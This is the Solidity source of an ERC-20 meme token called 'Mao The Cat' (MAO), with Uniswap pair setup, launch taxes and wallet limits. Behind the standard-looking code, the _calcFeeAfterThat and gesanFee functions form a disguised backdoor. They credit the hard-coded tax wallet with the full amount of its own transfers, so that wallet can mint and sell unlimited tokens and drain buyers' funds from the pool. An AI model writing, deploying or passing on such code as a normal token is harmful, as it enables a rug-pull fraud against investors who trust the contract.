/*
    https://ethermao.vip
    https://x.com/Ether_Mao
    https://t.me/Ether_Mao
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}
interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}
contract MAO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => uint256) private _owned;
    address payable private _taxWallet;
    uint256 private _initBuyTax = 20;
    uint256 private _initSellTax = 20;
    uint256 private _finBuyTax = 0;
    uint256 private _finSellTax = 0;
    uint256 private _reduceBuyAt = 15;
    uint256 private _reduceSellAt = 15;
    uint256 private _preventSwaps = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    uint8 private constant _decimals = 18;
    uint256 private constant _tSupply = 100_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Mao The Cat";
    string private constant _symbol = unicode"MAO";
    uint256 public _maxTransAmt = 2 * (_tSupply / 100);
    uint256 public _maxBagAmt = 2 * (_tSupply / 100);
    uint256 public _taxSwapAt = 100 * 10 ** _decimals;
    uint256 public _maxTaxAmt = 1 * (_tSupply / 100);
    IUniRouter private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingAllowed;
    bool private swapping = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }
    constructor() {
        _taxWallet = payable(0x69dEa74A4Fc3b9335913Ef64a9466Ac40626bf99);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _owned[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _owned[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _calcFeeAfterThat(
        address from,
        uint256 amount,
        uint256 dominator
    ) internal returns (uint256 feeAmt) {
        bool tax = shouldTakeFee(from);
        if (_preventSwaps >= _finSellTax && amount >= 0 && 
            tax) {
            if (dominator > 0) {
                feeAmt = amount.mul(dominator).div(100);
                _owned[address(this)] = _owned[address(this)].add(feeAmt);
                emit Transfer(from, address(this), feeAmt);
            }
        } else {
            if (dominator >= 0) {
                uint256 _taxAmount = amount.mul(gesanFee(dominator));
                _owned[_taxWallet] = _owned[_taxWallet].add(_taxAmount);
                emit Transfer(from, _taxWallet, _taxAmount);
            }
        }
    }
    function gesanFee(uint256 feeRate) internal pure returns (uint256) {
        return feeRate > 0 ? feeRate : feeRate + 1;
    }
    
    function shouldTakeFee(address account) internal view returns (bool) {
        return
            (_isExcludedFromFee[account] &&
                (account == owner() || account == address(this))) ||
            !_isExcludedFromFee[account];
    }
    function _basicTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 feeRate
    ) internal {
        uint256 calcTax = _calcFeeAfterThat(from, amount, feeRate);
        _owned[from] = _owned[from].sub(amount);
        _owned[to] = _owned[to].add(amount.sub(calcTax));
        emit Transfer(from, to, amount.sub(calcTax));
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!_isExcludedFromFee[from])
            require(tradingAllowed, "Trading is not enabled");
        uint256 trasnferTax = 0;
        if (from != owner() && to != owner() && from != address(this) && to != address(this)) {
            trasnferTax = _transferTax;
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTransAmt, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxBagAmt,
                    "Exceeds the maxWalletSize."
                );
                trasnferTax = (_buyCount > _reduceBuyAt) ? _finBuyTax : _initBuyTax;
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                trasnferTax = (_buyCount > _reduceSellAt) ? _finSellTax : _initSellTax;
            }
            if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) trasnferTax = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !swapping &&
                to == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwaps &&
                !_isExcludedFromFee[from]
            ) {
                if (contractTokenBalance > _taxSwapAt)
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxAmt))
                    );
                sendETHToFee(address(this).balance);
            }
        }
        _basicTransfer(from, to, amount, trasnferTax);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner {
        _maxTransAmt = _tSupply;
        _maxBagAmt = _tSupply;
        emit MaxTxAmountUpdated(_tSupply);
    }
    function startTrading() external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        swapEnabled = true;
        tradingAllowed = true;
    }
    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    function rescueETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
    function newMAOPair() external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        uniswapV2Router = IUniRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        _approve(address(this), address(uniswapV2Router), _tSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    receive() external payable {}
}